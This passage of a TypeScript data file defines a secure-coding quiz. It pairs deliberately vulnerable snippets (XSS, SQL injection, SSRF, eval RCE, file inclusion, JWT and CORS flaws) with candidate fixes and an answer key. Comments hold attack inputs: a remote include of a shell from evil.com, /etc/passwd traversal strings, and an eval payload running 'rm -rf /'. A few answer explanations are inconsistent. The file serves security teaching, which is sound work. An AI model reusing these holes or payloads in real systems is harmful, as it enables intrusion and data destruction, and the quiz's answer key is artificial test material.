

import type { SecurityFortressChallenge } from '@/lib/types';

export const securityFortressChallenges: SecurityFortressChallenge[] = [
    {
        id: '1',
        title: 'Reflected Cross-Site Scripting (XSS)',
        category: 'XSS',
        difficulty: 'Beginner',
        xp: 40,
        description: 'A search query from the URL is directly rendered into the HTML, allowing malicious scripts to be executed.',
        vulnerableCode: `// JavaScript (e.g., in a Node.js/Express app)
const urlParams = new URLSearchParams(window.location.search);
const query = urlParams.get('query');
document.getElementById('search-results').innerHTML = "You searched for: " + query;`,
        language: 'javascript',
        options: [
            {
                id: '1a',
                code: `// No change needed, browsers handle this automatically`
            },
            {
                id: '1b',
                code: `const query = urlParams.get('query');
document.getElementById('search-results').textContent = "You searched for: " + query;`
            },
            {
                id: '1c',
                code: `const query = urlParams.get('query').replace('script', '');
document.getElementById('search-results').innerHTML = "You searched for: " + query;`
            },
        ],
        correctOptionId: '1b',
        explanation: 'Using `textContent` instead of `innerHTML` ensures that the user-provided `query` is treated as plain text, not as HTML. This prevents the browser from interpreting any script tags or other malicious HTML that an attacker might inject into the URL parameter, effectively mitigating the Reflected XSS vulnerability.',
    },
    {
        id: '2',
        title: 'Basic SQL Injection',
        category: 'SQL Injection',
        difficulty: 'Beginner',
        xp: 50,
        description: 'User input is directly concatenated into a SQL query, allowing an attacker to manipulate the query structure.',
        vulnerableCode: `// Python (e.g., using a database library)
def get_user(user_id):
    query = "SELECT * FROM users WHERE id = '" + user_id + "'"
    # ... execute query ...`,
        language: 'python',
        options: [
            {
                id: '2a',
                code: `def get_user(user_id):
    query = f"SELECT * FROM users WHERE id = '{user_id}'"`
            },
            {
                id: '2b',
                code: `def get_user(user_id):
    # Use parameterized queries / prepared statements
    query = "SELECT * FROM users WHERE id = ?"
    # ... execute query with user_id as a parameter ...`
            },
            {
                id: '2c',
                code: `def get_user(user_id):
    if user_id.isalnum():
        query = "SELECT * FROM users WHERE id = '" + user_id + "'"
        # ... execute query ...`
            },
        ],
        correctOptionId: '2b',
        explanation: 'Parameterized queries (prepared statements) are the standard way to prevent SQL injection. The database treats the user input as data only, not as part of the executable SQL command.',
    },
    {
        id: '3',
        title: 'Insecure Direct Object Reference (IDOR)',
        category: 'IDOR',
        difficulty: 'Intermediate',
        xp: 60,
        description: 'An API endpoint allows a user to access a resource using its ID, but fails to check if the logged-in user is authorized to view that specific resource.',
        vulnerableCode: `// JavaScript (Node.js/Express)
app.get('/invoices/:invoiceId', (req, res) => {
  // Assume req.user contains the logged-in user's data
  const { invoiceId } = req.params;
  const invoice = db.invoices.find(invoiceId);
  res.json(invoice);
});`,
        language: 'javascript',
        options: [
            {
                id: '3a',
                code: `app.get('/invoices/:invoiceId', (req, res) => {
  const { invoiceId } = req.params;
  const invoice = db.invoices.find(invoiceId);
  // Check ownership before returning
  if (invoice.userId === req.user.id) {
    res.json(invoice);
  } else {
    res.status(403).send("Forbidden");
  }
});`
            },
            {
                id: '3b',
                code: `app.get('/invoices/:invoiceId', (req, res) => {
  const { invoiceId } = req.params;
  if (!isNaN(invoiceId)) {
    const invoice = db.invoices.find(invoiceId);
    res.json(invoice);
  } else {
     res.status(400).send("Bad Request");
  }
});`
            },
        ],
        correctOptionId: '3a',
        explanation: 'The correct fix is to perform an authorization check. After retrieving the resource, you must verify that the currently authenticated user has the right to access it.',
    },
    {
        id: '4',
        title: 'Stored Cross-Site Scripting (XSS)',
        category: 'XSS',
        difficulty: 'Intermediate',
        xp: 65,
        description: 'A user comment is saved to the database and then rendered as HTML for other users, allowing stored scripts to execute in their browsers.',
        vulnerableCode: `// PHP
$comment = $_POST['comment'];
// 1. Save $comment to the database...

// 2. Later, retrieve and display the comment:
echo "<div>" . $comment_from_db . "</div>";`,
        language: 'php',
        options: [
            {
                id: '4a',
                code: `// When displaying the comment:
echo "<div>" . htmlspecialchars($comment_from_db, ENT_QUOTES, 'UTF-8') . "</div>";`
            },
            {
                id: '4b',
                code: `// When saving the comment:
$comment = str_replace("<script>", "", $_POST['comment']);
// Save to DB...`
            },
            {
                id: '4c',
                code: `// No fix needed, modern databases prevent XSS.`
            }
        ],
        correctOptionId: '4a',
        explanation: 'The correct way to prevent XSS is to properly encode output for its context. `htmlspecialchars` converts special HTML characters (like <, >, ") into their corresponding HTML entities, so they are displayed as text instead of being interpreted as code by the browser.',
    },
    {
        id: '35',
        title: 'Server-Side Request Forgery (SSRF)',
        category: 'SSRF',
        difficulty: 'Advanced',
        xp: 80,
        description: 'An attacker can coerce the server-side application to make HTTP requests to an arbitrary domain of the attacker\'s choosing.',
        vulnerableCode: `// Python (Flask)
@app.route('/fetch_image')
def fetch_image():
    image_url = request.args.get('url')
    # The server fetches this URL and returns the content
    response = requests.get(image_url)
    return response.content`,
        language: 'python',
        options: [
            {
                id: '35a',
                code: `// Sanitize the URL by blocking "localhost" and "127.0.0.1".
if 'localhost' in image_url or '127.0.0.1' in image_url:
    return "Forbidden", 403`
            },
            {
                id: '35b',
                code: `// Use a strict whitelist of allowed domains and protocols.
from urllib.parse import urlparse
allowed_domains = ['images.example.com']
domain = urlparse(image_url).hostname
if domain in allowed_domains:
    # fetch...
else:
    return "Forbidden", 403`
            },
            {
                id: '35c',
                code: `// Ensure the URL starts with https://.
if not image_url.startswith('https://'):
    return "Forbidden", 403`
            },
        ],
        correctOptionId: '35b',
        explanation: 'The only reliable way to prevent SSRF is to maintain a strict whitelist of allowed domains, IP addresses, and protocols that the server is permitted to request. Blacklisting is easily bypassed.',
    },
    {
        id: '36',
        title: 'Remote Code Execution (RCE)',
        category: 'RCE',
        difficulty: 'Expert',
        xp: 100,
        description: 'A vulnerability that allows an attacker to execute arbitrary code on the target machine. This often happens through unsafe deserialization or command injection.',
        vulnerableCode: `// PHP
$data = $_GET['data'];
eval($data); // Extremely dangerous!`,
        language: 'php',
        options: [
            {
                id: '36a',
                code: `// NEVER use eval() on user-controlled input. Refactor the code to avoid it entirely.
// Use a safe, structured approach like a switch statement or function mapping.
switch($data) {
    case 'func1':
        my_function_1();
        break;
    // ...
}`
            },
            {
                id: '36b',
                code: `// Sanitize the input by removing dangerous function names.
$data = str_replace('system', '', $data);
eval($data);`
            },
            {
                id: '36c',
                code: `// Run the code in a sandboxed environment.
// This is complex and not a primary defense.
run_in_sandbox($data);`
            },
        ],
        correctOptionId: '36a',
        explanation: 'The `eval()` function is extremely dangerous and should never be used with user-provided input. The only secure solution is to completely avoid it and refactor the logic to use safe, structured code constructs.',
    },
    {
        id: '37',
        title: 'Insecure CORS Configuration',
        category: 'CORS',
        difficulty: 'Intermediate',
        xp: 60,
        description: 'The server\'s Cross-Origin Resource Sharing (CORS) policy is too permissive, allowing any website to make requests and read the response.',
        vulnerableCode: `// JavaScript (Node.js/Express)
// This allows ANY origin to access the resource.
app.use((req, res, next) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  next();
});`,
        language: 'javascript',
        options: [
            {
                id: '37a',
                code: `// Use a library like 'cors' and configure a strict whitelist of allowed origins.
const cors = require('cors');
const corsOptions = {
  origin: 'https://trusted.example.com'
};
app.use(cors(corsOptions));`
            },
            {
                id: '37b',
                code: `// Dynamically reflect the request's Origin header.
app.use((req, res, next) => {
  res.setHeader('Access-Control-Allow-Origin', req.headers.origin);
  next();
});`
            },
            {
                id: '37c',
                code: `// Only allow GET requests.
res.setHeader('Access-Control-Allow-Methods', 'GET');`
            },
        ],
        correctOptionId: '37a',
        explanation: 'A wildcard `*` for CORS is dangerous for any API that is not completely public. You must use a strict whitelist of specific domains that are trusted to make cross-origin requests.',
    },
    {
        id: '38',
        title: 'JWT Signature Bypass / "none" Algorithm',
        category: 'Auth',
        difficulty: 'Advanced',
        xp: 75,
        description: 'Some JWT libraries would accept a token with the algorithm field set to "none", bypassing signature verification entirely.',
        vulnerableCode: `// Python (PyJWT library, older version)
import jwt

# Attacker crafts a token with "alg": "none"
# and a modified payload (e.g., "user": "admin").
# Some libraries would accept this without a signature.

def decode_token(token):
    return jwt.decode(token, algorithms=['HS256', 'none'])`,
        language: 'python',
        options: [
            {
                id: '38a',
                code: `// Always specify the exact, expected algorithm(s) and never include 'none'.
def decode_token(token, secret):
    return jwt.decode(token, secret, algorithms=['HS256'])`
            },
            {
                id: '38b',
                code: `// Check if the algorithm is "none" before decoding.
def decode_token(token, secret):
    header = jwt.get_unverified_header(token)
    if header['alg'] == 'none':
        raise Exception("Bad algorithm")
    return jwt.decode(token, secret, algorithms=['HS256'])`
            },
            {
                id: '38c',
                code: `// Update the JWT library to the latest version. Modern versions disallow the 'none' algorithm by default.`
            },
        ],
        correctOptionId: '38c',
        explanation: 'While explicitly checking the algorithm is good practice (A, B), the most critical fix is to use an up-to-date JWT library where this vulnerability has been patched. Modern libraries require you to explicitly opt-in to insecure algorithms like "none".',
    },
    {
        id: '39',
        title: 'OAuth Misconfiguration',
        category: 'Auth',
        difficulty: 'Intermediate',
        xp: 65,
        description: 'The OAuth provider has a loosely configured redirect URI, allowing an attacker to have the authorization code sent to a malicious site.',
        vulnerableCode: `// OAuth Provider Configuration
// Allowed Redirect URI: https://example.com/callback?path=
// Attacker crafts a login URL with:
// redirect_uri=https://example.com/callback?path=evil.com`,
        language: 'generic',
        options: [
            {
                id: '39a',
                code: `// Use an exact match for the redirect URI.
// Allowed Redirect URI: https://example.com/callback
// Any other URI will be rejected.`
            },
            {
                id: '39b',
                code: `// URL-encode the redirect URI parameter.`
            },
            {
                id: '39c',
                code: `// Use a shorter authorization code lifetime.`
            },
        ],
        correctOptionId: '39a',
        explanation: 'OAuth redirect URIs must be compared using an exact string match. Allowing partial matches, wildcards, or paths opens the door for an attacker to specify a subdomain or path under their control.',
    },
    {
        id: '40',
        title: 'SAML Assertion Forgery',
        category: 'Auth',
        difficulty: 'Expert',
        xp: 95,
        description: 'The SAML service provider fails to properly validate the signature on an incoming SAML assertion, allowing an attacker to forge a valid assertion for any user.',
        vulnerableCode: `// Conceptual Java code for SAML processing
public void processSamlResponse(String samlResponse) {
    // Response is parsed, but the signature is NOT checked.
    String username = parseUsername(samlResponse);
    logInUser(username);
}`,
        language: 'java',
        options: [
            {
                id: '40a',
                code: `// Reject any assertion that does not have a signature.`
            },
            {
                id: '40b',
                code: `// Use a trusted SAML library and configure it to require and validate the signature against the Identity Provider's public key.`
            },
            {
                id: '40c',
                code: `// Encrypt the entire SAML assertion.`
            },
        ],
        correctOptionId: '40b',
        explanation: 'The core of SAML security is the cryptographic signature. The service provider MUST validate the signature on every assertion using the known public key of the trusted identity provider. Relying on anything less allows for trivial forgery.',
    },
    {
        id: '41',
        title: 'Directory Listing / Sensitive Files Exposure',
        category: 'Info Disclosure',
        difficulty: 'Beginner',
        xp: 40,
        description: 'The web server is configured to show a list of all files in a directory if no index file (like `index.html`) is present.',
        vulnerableCode: `// Apache Web Server Configuration (.htaccess or httpd.conf)
// If 'Options +Indexes' is present, or if 'Options -Indexes' is absent.
// Visiting http://example.com/images/ will list all images.`,
        language: 'generic',
        options: [
            {
                id: '41a',
                code: `// Explicitly disable directory listing in the server configuration.
Options -Indexes`
            },
            {
                id: '41b',
                code: `// Add an empty index.html file to every directory.`
            },
            {
                id: '41c',
                code: `// Use a robots.txt file to disallow access.`
            },
        ],
        correctOptionId: '41a',
        explanation: 'The most direct and secure fix is to configure the web server to never generate directory listings. Placing empty index files is a workaround that is easy to forget and doesn\'t scale.',
    },
    {
        id: '42',
        title: 'Unauthenticated API Endpoint',
        category: 'Broken Auth',
        difficulty: 'Intermediate',
        xp: 60,
        description: 'An API endpoint that should be protected requires no authentication, allowing anyone to access it.',
        vulnerableCode: `// JavaScript (Node.js/Express)
// This endpoint should be for logged-in users only.
app.get('/api/user/profile', (req, res) => {
    // ... logic to fetch and return a user's profile
});`,
        language: 'javascript',
        options: [
            {
                id: '42a',
                code: `// Add authentication middleware to the endpoint.
app.get('/api/user/profile', ensureIsLoggedIn, (req, res) => {
    // ...
});`
            },
            {
                id: '42b',
                code: `// Obfuscate the URL to make it hard to find.
app.get('/api/u/p/a9b8c7', ...)`
            },
            {
                id: '42c',
                code: `// Check for a specific HTTP header, like 'X-Requested-With'.`
            },
        ],
        correctOptionId: '42a',
        explanation: 'Access control for sensitive endpoints must be enforced on the server-side with proper authentication middleware. The middleware should check for a valid session, token, or API key before allowing the request to proceed.',
    },
    {
        id: '43',
        title: 'Excessive Data Exposure (API)',
        category: 'Info Disclosure',
        difficulty: 'Intermediate',
        xp: 60,
        description: 'An API endpoint returns the entire user object from the database, including sensitive data like password hashes or personal information not needed by the client.',
        vulnerableCode: `// JavaScript (Node.js/Express)
app.get('/api/users/:id', (req, res) => {
  const user = db.users.find(req.params.id);
  // Returns the full user object, including password hash, etc.
  res.json(user); 
});`,
        language: 'javascript',
        options: [
            {
                id: '43a',
                code: `// Create a Data Transfer Object (DTO) or manually map only the necessary fields.
const user = db.users.find(req.params.id);
const userDto = {
    id: user.id,
    name: user.name,
    username: user.username
};
res.json(userDto);`
            },
            {
                id: '43b',
                code: `// Encrypt the entire JSON response.`
            },
            {
                id: '43c',
                code: `// Remove the sensitive data on the client-side after receiving it.`
            },
        ],
        correctOptionId: '43a',
        explanation: 'APIs should be designed to return only the data that is absolutely necessary for the client. This practice, known as creating a DTO (Data Transfer Object) or "ViewModel", prevents accidentally leaking sensitive information.',
    },
    {
        id: '44',
        title: 'Insecure Direct Object Reference (File Access)',
        category: 'IDOR',
        difficulty: 'Advanced',
        xp: 80,
        description: 'An application allows users to download files, but the filename is user-controlled, potentially allowing access to any file on the server.',
        vulnerableCode: `// Python (Flask)
@app.route('/download')
def download_file():
    filename = request.args.get('file')
    # Vulnerable to path traversal, e.g., ?file=../../../../etc/passwd
    return send_from_directory('/var/www/uploads/', filename)`,
        language: 'python',
        options: [
            {
                id: '44a',
                code: `// Sanitize the filename by removing '..'
filename = filename.replace('..', '')`
            },
            {
                id: '44b',
                code: `// Verify that the requested file is within the intended directory.
import os
base_dir = '/var/www/uploads/'
safe_path = os.path.join(base_dir, filename)
if os.path.commonprefix((os.path.realpath(safe_path), base_dir)) != base_dir:
    abort(403)
return send_from_directory(...)`
            },
            {
                id: '44c',
                code: `// Don't use user input for filenames. Use IDs instead.
// Map an ID like '123' to a real filename on the server.
file_map = {'123': 'datasheet.pdf'}
real_filename = file_map.get(request.args.get('id'))`
            },
        ],
        correctOptionId: '44c',
        explanation: 'While path validation (B) is a good defense, the most robust solution for IDOR is to avoid using direct object references (like filenames) in URLs. Instead, use indirect references (like a numeric ID or a UUID) and map them to the actual file path on the server-side after verifying authorization.',
    },
    {
        id: '45',
        title: 'Remote File Inclusion (RFI)',
        category: 'File Inclusion',
        difficulty: 'Advanced',
        xp: 85,
        description: 'The application includes a script or file using a URL provided by the user, allowing an attacker to execute code from a remote server.',
        vulnerableCode: `// PHP
// Attacker sets ?page=http://evil.com/shell.txt
$page = $_GET['page'];
include($page);`,
        language: 'php',
        options: [
            {
                id: '45a',
                code: `// Disable 'allow_url_include' in php.ini.
// allow_url_include = Off`
            },
            {
                id: '45b',
                code: `// Use a strict whitelist of allowed files.
$allowed_pages = ['home.php', 'about.php'];
if (in_array($page, $allowed_pages)) {
    include($page);
}`
            },
            {
                id: '45c',
                code: 'Both A and B are necessary for a secure configuration.'
            },
        ],
        correctOptionId: '45c',
        explanation: 'RFI is extremely dangerous. The best defense is to disable the feature at the server configuration level (A) and to also implement application-level logic (B) that only allows including files from a known, trusted list.',
    },
    {
        id: '46',
        title: 'Local File Inclusion (LFI)',
        category: 'File Inclusion',
        difficulty: 'Advanced',
        xp: 80,
        description: 'An attacker can include and execute files from the local server by manipulating a filename parameter, often using path traversal.',
        vulnerableCode: `// PHP
// Attacker sets ?page=../../../../etc/passwd
$page = $_GET['page'];
include($page . '.php');`,
        language: 'php',
        options: [
            {
                id: '46a',
                code: `// Strip out path traversal characters.
$page = str_replace('../', '', $_GET['page']);
include($page . '.php');`
            },
            {
                id: '46b',
                code: `// Use a strict whitelist of allowed page names.
$allowed = ['home', 'about', 'contact'];
if (in_array($page, $allowed)) {
    include($page . '.php');
}`
            },
            {
                id: '46c',
                code: `// Validate that the filename only contains alphanumeric characters.
if (ctype_alnum($page)) {
    include($page . '.php');
}`
            },
        ],
        correctOptionId: '46b',
        explanation: 'Blacklisting bad characters (like in A and C) is often bypassable. The most secure approach is to use a whitelist, where you explicitly define the exact set of files that are allowed to be included.',
    },
    {
        id: '47',
        title: 'Server Information Disclosure (Stack Trace)',
        category: 'Info Disclosure',
        difficulty: 'Beginner',
        xp: 45,
        description: 'In a production environment, a detailed stack trace is shown to the user when an unhandled exception occurs.',
        vulnerableCode: `// Python (Flask in debug mode)
// app.run(debug=True)
// An unhandled exception will display a full, interactive traceback in the browser.`,
        language: 'python',
        options: [
            {
                id: '47a',
                code: `// Disable debug mode in production.
// app.run(debug=False)
// And configure a custom error handler to show a generic page.`
            },
            {
                id: '47b',
                code: `// Wrap every single function in a try...except block.`
            },
            {
                id: '47c',
                code: `// Use a web application firewall (WAF) to block error pages.`
            },
        ],
        correctOptionId: '47a',
        explanation: 'Debug mode should NEVER be enabled in a production environment. Applications must be configured to catch all unhandled exceptions and display a generic error page to the user, while logging the detailed error on the server for developers.',
    },
    {
        id: '48',
        title: 'Backup File Exposure (.git, .env)',
        category: 'Info Disclosure',
        difficulty: 'Intermediate',
        xp: 55,
        description: 'A web server is configured to serve files like `.git/config` or `.env`, exposing sensitive information.',
        vulnerableCode: `// Generic Web Server issue.
// An attacker can browse to https://example.com/.git/config
// and see repository information.`,
        language: 'generic',
        options: [
            {
                id: '48a',
                code: `// Ensure the deployment process does not copy these directories to the web root.`
            },
            {
                id: '48b',
                code: `// Configure the web server (e.g., Nginx, Apache) to explicitly deny access to these sensitive directories and files.`
            },
            {
                id: '48c',
                code: `Both A and B are essential. The files should not be there in the first place, and the server should block them as a second layer of defense.`
            },
        ],
        correctOptionId: '48c',
        explanation: 'Defense in depth is key. Your deployment pipeline should be configured to never place sensitive files like `.git` or `.env` in a public web directory (A). Additionally, your web server should be configured to block access to them just in case they are accidentally exposed (B).',
    },
    {
        id: '49',
        title: 'Insecure Use of eval()/exec()',
        category: 'RCE',
        difficulty: 'Expert',
        xp: 95,
        description: 'Code dynamically executes a string that can be influenced by user input, leading to Remote Code Execution (RCE).',
        vulnerableCode: `// Python
user_input = request.args.get('formula')
# User input might be "__import__('os').system('rm -rf /')"
result = eval(user_input)`,
        language: 'python',
        options: [
            {
                id: '49a',
                code: `// NEVER use eval() on user input. Find a safer way to implement the desired logic.
// If it's for math, use a dedicated math expression parser.
// For other logic, use if/else or dictionary mapping.`
            },
            {
                id: '49b',
                code: `// Sanitize the input to remove keywords like 'import' and 'os'.
if 'import' in user_input:
    raise ValueError("Invalid input")
result = eval(user_input)`
            },
            {
                id: '49c',
                code: `// Limit the globals and locals available to eval().
result = eval(user_input, {'__builtins__': {}}, {})`
            },
        ],
        correctOptionId: '49a',
        explanation: '`eval()` is considered a major security risk. Blacklisting dangerous keywords is fragile and easily bypassed. While limiting the scope helps, it\'s still risky. The only truly safe solution is to avoid `eval()` entirely and refactor the code to use safe, alternative approaches.',
    },
    {
        id: '50',
        title: 'Privilege Escalation (Role Bypass)',
        category: 'Broken Access Control',
        difficulty: 'Advanced',
        xp: 85,
        description: 'A user is able to perform an action that should be restricted to a higher privilege level, like an administrator.',
        vulnerableCode: `// JavaScript (Node.js/Express)
app.post('/users/:id/delete', (req, res) => {
    // This endpoint should only be callable by an admin, or the user themselves.
    // It currently has no authorization check.
    const userIdToDelete = req.params.id;
    db.deleteUser(userIdToDelete);
    res.send("User deleted");
});`,
        language: 'javascript',
        options: [
            {
                id: '50a',
                code: `// Add a check that the logged-in user is either an admin or is deleting their own account.
app.post('/users/:id/delete', (req, res) => {
    const userIdToDelete = req.params.id;
    const loggedInUser = req.user;
    if (loggedInUser.role === 'admin' || loggedInUser.id === userIdToDelete) {
        db.deleteUser(userIdToDelete);
        res.send("User deleted");
    } else {
        res.status(403).send("Forbidden");
    }
});`
            },
            {
                id: '50b',
                code: `// Make it a DELETE request instead of POST.`
            },
            {
                id: '50c',
                code: `// Ask the user to re-enter their password before deleting.`
            },
        ],
        correctOptionId: '50a',
        explanation: 'Every privileged action must have a corresponding authorization check on the server-side. The server must verify that the authenticated user has the necessary permissions to perform the requested action on the target resource.',
    },
    {
        id: '51',
        title: 'Insecure Mobile Storage (Sensitive Data)',
        category: 'Mobile Security',
        difficulty: 'Intermediate',
        xp: 60,
        description: 'A mobile application stores sensitive information, like an API token, in an insecure location like `SharedPreferences` (Android) or `UserDefaults` (iOS) without encryption.',
        vulnerableCode: `// Java (Android)
SharedPreferences prefs = context.getSharedPreferences("user_prefs", Context.MODE_PRIVATE);
prefs.edit().putString("api_token", token).apply();`,
        language: 'java',
        options: [
            {
                id: '51a',
                code: `// Use the Android Keystore system to generate an encryption key and encrypt the data before storing it.
// Use EncryptedSharedPreferences for a simpler API.`
            },
            {
                id: '51b',
                code: `// Obfuscate the token before storing it.
prefs.edit().putString("api_token", new StringBuilder(token).reverse().toString()).apply();`
            },
            {
                id: '51c',
                code: `// Store the token in a file in the app's private directory.`
            },
        ],
        correctOptionId: '51a',
        explanation: 'On a rooted device, `SharedPreferences` can be easily read. All sensitive data stored on a mobile device must be encrypted using platform-provided secure storage mechanisms, like the Android Keystore or iOS Keychain.',
    },
    {
        id: '52',
        title: 'Improper Session Timeout',
        category: 'Session Management',
        difficulty: 'Beginner',
        xp: 40,
        description: 'A web application\'s sessions never expire, meaning that if a session token is stolen, it can be used indefinitely.',
        vulnerableCode: `// Conceptual - Server Session Configuration
// Session timeout is set to "infinity" or a very long duration (e.g., 30 days).`,
        language: 'generic',
        options: [
            {
                id: '52a',
                code: `// Implement a reasonable session timeout on the server side.
// e.g., 15-30 minutes of inactivity for a standard application.
// Also implement an absolute timeout (e.g., 8 hours).`
            },
            {
                id: '52b',
                code: `// Rely on the user to manually log out.`
            },
            {
                id: '52c',
                code: `// Store the session token in localStorage instead of a cookie.`
            },
        ],
        correctOptionId: '52a',
        explanation: 'Sessions must have a defined expiration time to limit the window of opportunity for an attacker who steals a session token. A combination of an inactivity/sliding timeout and an absolute timeout is best practice.',
    },
    {
        id: '53',
        title: 'Weak Multi-Factor Authentication Implementation',
        category: 'Auth',
        difficulty: 'Advanced',
        xp: 80,
        description: 'A 2FA/MFA implementation can be bypassed. For example, the verification step is not properly linked to the login session.',
        vulnerableCode: `// Conceptual Flow
// 1. User submits username/password. Server says "OK".
// 2. User is redirected to a page: /verify-2fa.
// 3. After verifying 2FA, user is logged in.
// Attacker can log in with just username/password, then skip step 2 and go directly to a post-login page like /dashboard.`,
        language: 'generic',
        options: [
            {
                id: '53a',
                code: `// After successful password login, the server should create a temporary "pre-authentication" session state.
// The user should not be fully authenticated until the 2FA step is also completed within this same session.`
            },
            {
                id: '53b',
                code: `// Use SMS for 2FA as it is the most common method.`
            },
            {
                id: '53c',
                code: `// Rate-limit 2FA code attempts.`
            },
        ],
        correctOptionId: '53a',
        explanation: 'MFA must be a blocking step in a single, unified authentication flow. An initial login success should only grant a temporary status that is not fully authenticated. Full access is only granted after the second factor is successfully verified.',
    },
    {
        id: '54',
        title: 'Insecure Object Serialization (Java/.NET)',
        category: 'Insecure Deserialization',
        difficulty: 'Advanced',
        xp: 85,
        description: 'A Java application deserializes an object from an untrusted source, which can be exploited for Remote Code Execution (RCE) using gadget chains.',
        vulnerableCode: `// Java
// Attacker sends a malicious serialized object.
public Object process(InputStream untrustedStream) throws Exception {
    ObjectInputStream in = new ObjectInputStream(untrustedStream);
    return in.readObject(); // Vulnerable
}`,
        language: 'java',
        options: [
            {
                id: '54a',
                code: `// Use a "look-ahead" deserialization library that validates the class types in the stream before they are instantiated.`
            },
            {
                id: '54b',
                code: `// Avoid native Java serialization. Use a safe, data-only format like JSON with a library like Jackson or GSON.`
            },
            {
                id: '54c',
                code: `Both A and B are valid strategies, but B is generally the safest and most recommended approach for modern applications.`
            },
        ],
        correctOptionId: '54c',
        explanation: 'Native Java serialization is notoriously unsafe. While look-ahead validation (A) can mitigate the risk, the most robust and modern solution is to avoid it entirely and use a safe format like JSON for data exchange (B).',
    },
    {
        id: '55',
        title: 'Unsafe Use of Third-Party Libraries (Supply Chain)',
        category: 'Supply Chain',
        difficulty: 'Expert',
        xp: 100,
        description: 'An application uses a third-party library with a known, critical vulnerability.',
        vulnerableCode: `// package.json
{
  "dependencies": {
    "left-pad": "0.0.1", // An old, hypothetical vulnerable version
    "some-other-lib": "1.2.3"
  }
}`,
        language: 'javascript',
        options: [
            {
                id: '55a',
                code: `// Regularly scan dependencies for known vulnerabilities using tools like 'npm audit', 'Snyk', or 'GitHub Dependabot'.
// Update vulnerable packages to a safe, patched version.`
            },
            {
                id: '55b',
                code: `// Write your own version of the library to avoid the dependency.`
            },
            {
                id: '55c',
                code: `// Use a firewall to block exploits targeting the library.`
            },
        ],
        correctOptionId: '55a',
        explanation: 'Supply chain security is critical. You must have an automated process to continuously scan your project\'s dependencies for known vulnerabilities and have a plan to update or replace them promptly when a security issue is discovered.',
    },
    {
        id: '56',
        title: 'Cross-Origin Resource Leak (CORS Preflight Abuse)',
        category: 'CORS',
        difficulty: 'Advanced',
        xp: 75,
        description: 'A server responds to an `OPTIONS` preflight request with permissive headers, but the actual `POST` request handler does not properly validate the request.',
        vulnerableCode: `// JavaScript (Node.js/Express)
// Preflight handler is too permissive
app.options('/api/sensitive', cors({ origin: 'https://partner.com' }));

// Actual POST handler has no CORS check, allowing any origin
app.post('/api/sensitive', (req, res) => {
  // ... do sensitive stuff
});`,
        language: 'javascript',
        options: [
            {
                id: '56a',
                code: `// The CORS middleware must be applied to the actual route, not just the OPTIONS handler.
// This ensures the check is performed for all request methods.
const corsOptions = { origin: 'https://partner.com' };
app.options('/api/sensitive', cors(corsOptions)); // For preflight
app.post('/api/sensitive', cors(corsOptions), (req, res) => { /*...*/ }); // For actual request`
            },
            {
                id: '56b',
                code: `// Block all OPTIONS requests.`
            },
            {
                id: '56c',
                code: `// Check the Origin header manually inside the POST handler.`
            },
        ],
        correctOptionId: '56a',
        explanation: 'CORS checks must be enforced on the actual request (e.g., POST, PUT), not just the preflight (OPTIONS) request. A common mistake is to have a permissive preflight response but fail to validate the `Origin` header on the subsequent request.',
    },
    {
        id: '57',
        title: 'Misconfigured Content Security Policy (CSP) Bypass',
        category: 'XSS / CSP',
        difficulty: 'Advanced',
        xp: 80,
        description: 'A Content Security Policy (CSP) is in place, but it includes `unsafe-inline` or a too-permissive source, allowing it to be bypassed.',
        vulnerableCode: `// HTTP Response Header
Content-Security-Policy: script-src 'self' 'unsafe-inline' https://cdnjs.cloudflare.com;`,
        language: 'generic',
        options: [
            {
                id: '57a',
                code: `// Remove 'unsafe-inline'. Refactor any inline scripts to be in separate .js files served from the same origin.
// Tightly scope the allowed domains.
Content-Security-Policy: script-src 'self' https://trusted.cdn.com;`
            },
            {
                id: '57b',
                code: `// Add a 'nonce' to the policy and to each legitimate inline script tag.
// CSP: script-src 'self' 'nonce-rAnd0m';
// HTML: <script nonce="rAnd0m">...</script>`
            },
            {
                id: '57c',
                code: 'Both A and B are valid strategies for strengthening a weak CSP.'
            },
        ],
        correctOptionId: '57c',
        explanation: '`unsafe-inline` effectively negates many of the benefits of CSP. The best practice is to move all inline scripts to external files (A). If inline scripts are absolutely necessary, you must use a nonce or hash-based approach to whitelist them individually (B).',
    },
    {
        id: '58',
        title: 'Business Logic Flaw (Credit Manipulation)',
        category: 'Business Logic',
        difficulty: 'Expert',
        xp: 95,
        description: 'An endpoint for transferring credits from one user to another doesn\'t prevent a user from transferring a negative amount.',
        vulnerableCode: `// JavaScript (API Endpoint)
app.post('/transfer', (req, res) => {
  const { toUserId, amount } = req.body;
  const fromUser = req.user;

  // Attacker sends: { toUserId: 'victim', amount: -1000 }
  // This effectively STEALS credits from the victim.
  fromUser.credits += amount;
  const toUser = db.findUser(toUserId);
  toUser.credits -= amount;

  res.send("Transfer successful");
});`,
        language: 'javascript',
        options: [
            {
                id: '58a',
                code: `// Add server-side validation to ensure the transfer amount is a positive number.
if (amount <= 0) {
  return res.status(400).send("Invalid amount");
}`
            },
            {
                id: '58b',
                code: `// Use an unsigned integer type for the 'amount' in the database.`
            },
            {
                id: '58c',
                code: `// Check that the 'fromUser' has sufficient credits for the transfer.`
            },
        ],
        correctOptionId: '58a',
        explanation: 'Business logic flaws occur when the application behaves correctly from a technical standpoint but allows for unintended, harmful user actions. The server must always validate that user inputs make sense in the context of the business rule, such as ensuring a transfer amount is positive.',
    },
    {
        id: '59',
        title: 'Insecure Payment Flow / Tampered Prices',
        category: 'Business Logic',
        difficulty: 'Advanced',
        xp: 85,
        description: 'The price of an item is sent from the client to the server during checkout, allowing an attacker to tamper with it.',
        vulnerableCode: `// JavaScript (Client-side)
function checkout() {
    const price = document.getElementById('price').textContent;
    const itemId = 'prod_123';
    // Attacker can modify 'price' in their browser before sending.
    fetch('/api/charge', { method: 'POST', body: { itemId, price } });
}`,
        language: 'javascript',
        options: [
            {
                id: '59a',
                code: `// The server must NOT trust the price sent from the client.
// It should re-fetch the item's price from its own database using the item ID.
app.post('/api/charge', (req, res) => {
    const { itemId } = req.body;
    const item = db.products.find(itemId);
    const price = item.price; // Get authoritative price from DB.
    // ... create charge with the correct price ...
});`
            },
            {
                id: '59b',
                code: `// Encrypt the price on the client before sending it.`
            },
            {
                id: '59c',
                code: `// Validate that the price is a positive number on the server.`
            },
        ],
        correctOptionId: '59a',
        explanation: 'Never trust the client. Any security-sensitive data, especially price, must be authoritatively determined by the server. The client should only send non-sensitive identifiers (like an item ID), and the server should look up the corresponding price.',
    },
    {
        id: '60',
        title: 'API Rate-Limit Bypass / Abuse',
